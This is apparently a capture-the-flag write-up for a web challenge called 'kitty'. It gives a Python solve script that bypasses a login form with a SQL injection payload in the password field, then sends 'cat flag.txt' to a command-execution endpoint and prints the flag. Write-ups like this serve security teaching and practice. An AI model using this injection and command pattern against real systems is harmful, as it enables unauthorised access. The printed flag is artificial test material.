# kitty

## Description
```
Tetanus is a serious, potentially life-threatening infection that can be transmitted by an animal bite. 
```

## Writeup

Taking a look at the provided website I saw a login forms. <br/>
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="container">
        <h2>Login</h2>
        <form id="login-form" action="/login" method="POST">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" required>    
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Login</button>
        </form>
    </div>

    <script src="/static/script.js"></script>
</body>
</html>
```

The `script.js`:
```js
document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const data = {
        "username": username,
        "password": password
    };

    fetch('/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        // You can handle the response here as needed
        if (data.message === "Login successful!") {
            window.location.href = '/dashboard'; // Redirect to the dashboard
        } else {
            // Display an error message for invalid login
            const errorMessage = document.createElement('p');
            errorMessage.textContent = "Invalid username or password";
            document.getElementById('login-form').appendChild(errorMessage);

            // Remove the error message after 4 seconds
            setTimeout(() => {
                errorMessage.remove();
            }, 4000);
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
```

Now seeing this I thought of some kind of `SQL-Injection` vulnerability. <br/>
For this purpose I wrote a small python script for efficiency purposes. <br/>
```py
import requests

session = requests.Session()

base_URL = 'http://45.33.123.243:5020/'

login_data = {
    'username': 'yes',
    'password': '" or 1=1; -- "'
}

req = session.post(f'{base_URL}login', json=login_data)

req = session.get(f'{base_URL}dashboard')

print(req.text)
```

Executing this I bypassed the login and got access to dashboard. <br/>
```html
kali@kali python3 solve.py

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern Dashboard</title>
    <link rel="stylesheet" href="/static/dashboard.css">
</head>
<body>

<div class="container">
    <header>
        <h1>Welcome to the Dashboard</h1>
    </header>

    <section class="content">
        <h2>Latest Posts</h2>
        <div class="post">
            <h3>Post Title 1</h3>
            <p>This is some content for the first post.</p>
        </div>
        <div class="post">
            <h3>Post Title 2</h3>
            <p>This is some content for the second post.</p>
        </div>
        <div class="post">
            <h3>Post Title 3</h3>
            <p>This is some content for the third post.</p>
        </div>
        <!-- You can add more posts dynamically here -->
    </section>

    <section class="posts">
        <form id="postsForm" onsubmit="addPost(event)">
            <label for="post_input">Enter Post:</label><br>
            <input type="text" id="post_input" name="post_input">
            <button type="submit">Execute</button>
        </form>
    </section>
</div>

<script>
    function addPost(event) {
        event.preventDefault();
        const post_in = document.getElementById('post_input').value;

        if (post_in.startsWith('cat flag.txt')) {
            fetch('/execute', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `post_input=${encodeURIComponent(post_in)}`
            })
            .then(response => response.text())
            .then(result => {
                const contentSection = document.querySelector('.content');
                const newPost = document.createElement('div');
                newPost.classList.add('post');
                newPost.innerHTML = `<h3>Flag Post</h3><p>${result}</p>`;
                contentSection.appendChild(newPost);
            });
        } else {
            const contentSection = document.querySelector('.content');
            const newPost = document.createElement('div');
            newPost.classList.add('post');
            newPost.innerHTML = `<h3>User Post</h3><p>${post_in}</p>`;
            contentSection.appendChild(newPost);
        }
    }
</script>

</body>
</html>
```

Getting `/dashboard` I changed my script to retrieve the flag. <br/>
```py
import requests

session = requests.Session()

base_URL = 'http://45.33.123.243:5020/'

# forms data with sql injection
login_data = {
    'username': 'yes',
    'password': '" or 1=1; -- "'
}

# Login to get access to dashboard
req = session.post(f'{base_URL}login', json=login_data)

# Set 
payload = {'post_input': 'cat flag.txt'}
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

# Retrieve flag
req = session.post(f'{base_URL}execute', data=payload, headers=headers)

print(req.text)
```

Executing the script I obtained the flag which concludes the writeup. <br/>
```sh
kali@kali python3 ./kitty/solve.py
<pre>
KCTF{Fram3S_n3vE9_L1e_4_toGEtH3R}
</pre> 
```
